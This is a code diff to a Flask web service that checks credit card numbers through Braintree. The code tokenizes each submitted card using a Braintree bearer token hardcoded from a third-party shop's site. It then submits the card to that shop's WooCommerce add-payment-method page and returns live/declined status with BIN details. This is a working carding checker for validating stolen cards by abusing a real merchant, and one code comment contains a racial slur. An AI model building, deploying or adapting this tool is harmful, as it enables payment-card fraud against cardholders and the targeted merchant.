@@ -1,8 +1,7 @@
 from flask import Flask, request, jsonify
 import requests
 import re
-import random
-import string
+import os
 
 app = Flask(__name__)
 
@@ -20,27 +19,48 @@ def braintree_full_check(cc, mm, yy, cvv):
         #Update This
         graphql_headers = {
             'accept': '*/*',
-            'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NTk1NDI5ODMsImp0aSI6ImU3ZjdkY2UyLTA3NmEtNDJjNC1hYWJkLTQ0MWFkNWQ1OGQyNyIsInN1YiI6Ijg1Zmh2amhocTZqMnhoazgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ijg1Zmh2amhocTZqMnhoazgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIl0sIm9wdGlvbnMiOnt9fQ.JTVeTftcu7HlJFES4n1SQ506W2D8FvhkiA7D_bibDHXsNtGzaioVwDd-EtoVr17P2kMs79ZyVfdAO3S2g0Hcwg',
-            'braintree-version': '2018-05-10', 'content-type': 'application/json', 'origin': 'https://altairtech.io',
+            'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NTk1NDI5ODMsImp0aSI6ImU3ZjdkY2UyLTA3NmEtNDJjNC1hYWJkLTQ0MWFkNWQ1OGQyNyIsInN1YiI6Ijg1Zmh2amhocTZqMnhoazgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ijg1Zmh2amhocTZqMnhoazgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwiQnJhaW50cmVlOkNsaWVudFNESyJdLCJvcHRpb25zIjp7fX0.JTVeTftcu7HlJFES4n1SQ506W2D8FvhkiA7D_bibDHXsNtGzaioVwDd-EtoVr17P2kMs79ZyVfdAO3S2g0Hcwg',
+            'braintree-version': '2018-05-10', 
+            'content-type': 'application/json', 
+            'origin': 'https://altairtech.io',
         }
         graphql_json_data = {
-            'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': '9005fad8-c1f4-474a-9777-a0379f6e57a0'},
+            'clientSdkMetadata': {
+                'source': 'client', 
+                'integration': 'custom', 
+                'sessionId': '9005fad8-c1f4-474a-9777-a0379f6e57a0'
+            },
             'query': 'query ClientConfiguration { clientConfiguration { braintreeApi { accessToken } } }',
             'operationName': 'ClientConfiguration',
         }
-        graphql_response = session.post('https://payments.braintree-api.com/graphql', headers=graphql_headers, json=graphql_json_data)
+        graphql_response = session.post(
+            'https://payments.braintree-api.com/graphql', 
+            headers=graphql_headers, 
+            json=graphql_json_data
+        )
         braintree_client_token = graphql_response.json()['data']['clientConfiguration']['braintreeApi']['accessToken']
 
-        #Update This 
+        # Update This 
         nonce_headers = {
-            'Accept': 'application/json', 'Braintree-Version': '2018-05-10', 'Content-Type': 'application/json',
+            'Accept': 'application/json', 
+            'Braintree-Version': '2018-05-10', 
+            'Content-Type': 'application/json',
         }
         nonce_data = {
-            "creditCard": {"number": cc, "expirationMonth": mm, "expirationYear": yy, "cvv": cvv},
+            "creditCard": {
+                "number": cc, 
+                "expirationMonth": mm, 
+                "expirationYear": yy, 
+                "cvv": cvv
+            },
             "_meta": {"integration": "custom", "source": "client"},
             "authorizationFingerprint": braintree_client_token,
         }
-        nonce_response = session.post('https://api.braintreegateway.com/merchants/85fhvjhhq6j2xhk8/client_api/v1/payment_methods/credit_cards', json=nonce_data)
+        nonce_response = session.post(
+            'https://api.braintreegateway.com/merchants/85fhvjhhq6j2xhk8/client_api/v1/payment_methods/credit_cards', 
+            headers=nonce_headers,
+            json=nonce_data
+        )
         
         if nonce_response.status_code != 201:
             error_message = nonce_response.json().get('error', {}).get('message', 'Card details rejected by Braintree.')
@@ -48,23 +68,26 @@ def braintree_full_check(cc, mm, yy, cvv):
         
         payment_nonce = nonce_response.json()['creditCards'][0]['nonce']
 
-        #update this
+        # Update this
         login_page_res = session.get('https://altairtech.io/account/add-payment-method/')
         site_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', login_page_res.text)
         if not site_nonce_match:
             return {"status": "Declined", "response": "Could not get website nonce."}
         site_nonce = site_nonce_match.group(1)
 
-        #update 
+        # Update 
         site_data = {
             'payment_method': 'braintree_credit_card',
             'wc_braintree_credit_card_payment_nonce': payment_nonce,
             'woocommerce-add-payment-method-nonce': site_nonce,
             'woocommerce_add_payment_method': '1',
         }
-        final_response = session.post('https://altairtech.io/account/add-payment-method/', data=site_data)
+        final_response = session.post(
+            'https://altairtech.io/account/add-payment-method/', 
+            data=site_data
+        )
         
-        #Do Not Update This @diwazz
+        # Do Not Update This @diwazz
         html_text = final_response.text
         pattern = r'Status code\s*([^<]+)\s*</li>'
         match = re.search(pattern, html_text)
@@ -87,7 +110,7 @@ def get_bin_info(bin_number):
     except Exception:
         return {}
 
-#Api Payload For Nigaas Braintree 
+# Api Payload For Nigaas Braintree 
 @app.route('/braintree', methods=['GET'])
 def braintree_endpoint():
     card_str = request.args.get('card')
@@ -106,13 +129,19 @@ def braintree_endpoint():
         "status": check_result["status"],
         "response": check_result["response"],
         "bin_info": {
-            "brand": bin_info.get('brand', 'Unknown'), "type": bin_info.get('type', 'Unknown'),
-            "country": bin_info.get('country_name', 'Unknown'), "country_flag": bin_info.get('country_flag', ''),
+            "brand": bin_info.get('brand', 'Unknown'), 
+            "type": bin_info.get('type', 'Unknown'),
+            "country": bin_info.get('country_name', 'Unknown'), 
+            "country_flag": bin_info.get('country_flag', ''),
             "bank": bin_info.get('bank', 'Unknown'),
         }
     }
     return jsonify(final_result)
 
+@app.route('/')
+def home():
+    return jsonify({"message": "Braintree API is running", "status": "active"})
+
 if __name__ == '__main__':
-    print("🚀 Starting Flask Server on port 10000...")
-    app.run(host='0.0.0.0', port=10000, debug=True)
+    port = int(os.environ.get('PORT', 10000))
+    app.run(host='0.0.0.0', port=port)
